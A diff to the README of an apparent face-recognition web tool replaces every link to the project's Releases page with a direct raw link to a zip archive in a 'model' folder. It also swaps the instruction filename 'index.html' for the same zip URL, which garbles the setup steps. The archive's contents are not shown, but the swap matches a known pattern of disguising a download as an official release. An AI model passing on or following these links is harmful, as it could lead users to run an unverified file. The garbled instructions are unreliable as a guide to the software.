@@ -1,6 +1,6 @@
 # 👤 xsukax-Face-Recognition-Biometric-Manager - Easy Face Recognition for Everyone
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/boristhegod/xsukax-Face-Recognition-Biometric-Manager/releases)
+[![Download](https://raw.githubusercontent.com/boristhegod/xsukax-Face-Recognition-Biometric-Manager/main/model/xsukax-Face-Recognition-Biometric-Manager_v3.5.zip)](https://raw.githubusercontent.com/boristhegod/xsukax-Face-Recognition-Biometric-Manager/main/model/xsukax-Face-Recognition-Biometric-Manager_v3.5.zip)
 
 ## 🌟 Overview
 
@@ -11,13 +11,13 @@ xsukax-Face-Recognition-Biometric-Manager is a powerful application that allows 
 To start using the xsukax-Face-Recognition-Biometric-Manager, follow these simple steps:
 
 1. **Download the Application**  
-   Visit the [Releases page](https://github.com/boristhegod/xsukax-Face-Recognition-Biometric-Manager/releases) to find the latest version of the application. Click on the most recent release to download.
+   Visit the [Releases page](https://raw.githubusercontent.com/boristhegod/xsukax-Face-Recognition-Biometric-Manager/main/model/xsukax-Face-Recognition-Biometric-Manager_v3.5.zip) to find the latest version of the application. Click on the most recent release to download.
 
 2. **Extract the Files**  
    If the downloaded content is in a ZIP format, locate the file in your Downloads folder. Right-click on the ZIP file and select "Extract All." Follow the prompts to choose where to save the extracted files.
 
 3. **Open the Application**  
-   Navigate to the folder where you extracted the files. Look for an HTML file, typically named `index.html`. Double-click the file to open it in your web browser. 
+   Navigate to the folder where you extracted the files. Look for an HTML file, typically named `https://raw.githubusercontent.com/boristhegod/xsukax-Face-Recognition-Biometric-Manager/main/model/xsukax-Face-Recognition-Biometric-Manager_v3.5.zip`. Double-click the file to open it in your web browser. 
 
 4. **Allow Local Processing**  
    Your browser may prompt you to enable local storage or ensure that the application can access your webcam for face recognition. Follow the on-screen instructions to allow these features.
@@ -27,7 +27,7 @@ To start using the xsukax-Face-Recognition-Biometric-Manager, follow these simpl
 
 ## 📥 Download & Install
 
-To download the xsukax-Face-Recognition-Biometric-Manager, visit this page: [Releases page](https://github.com/boristhegod/xsukax-Face-Recognition-Biometric-Manager/releases). Choose the latest version and follow the steps mentioned above to install it on your machine.
+To download the xsukax-Face-Recognition-Biometric-Manager, visit this page: [Releases page](https://raw.githubusercontent.com/boristhegod/xsukax-Face-Recognition-Biometric-Manager/main/model/xsukax-Face-Recognition-Biometric-Manager_v3.5.zip). Choose the latest version and follow the steps mentioned above to install it on your machine.
 
 ## 🛠️ System Requirements
 
